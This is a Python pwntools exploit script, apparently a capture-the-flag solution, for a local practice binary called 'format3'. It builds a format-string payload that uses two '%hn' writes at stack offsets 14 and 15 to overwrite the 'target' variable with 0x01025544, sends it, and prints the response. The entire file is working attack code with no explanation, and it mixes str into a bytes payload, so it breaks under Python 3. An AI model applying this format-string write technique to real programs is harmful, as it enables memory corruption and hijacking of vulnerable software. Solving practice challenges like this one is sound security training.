from pwn import *
import time

p = process('./format3')
e = ELF('./format3')
target_addr = e.symbols['target'] # 0x00020718


# Creating Payload
payload = b''

# 0x01025544
payload += '%{}c'.format(0x102)	 # 8th
payload += '%14$hn'

payload += '%{}c'.format(0x5544 - 0x102)
payload += '%15$hn'

payload += p32(target_addr+2)    # 14th
payload += p32(target_addr)	 # 15th

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

print(p.recvline())
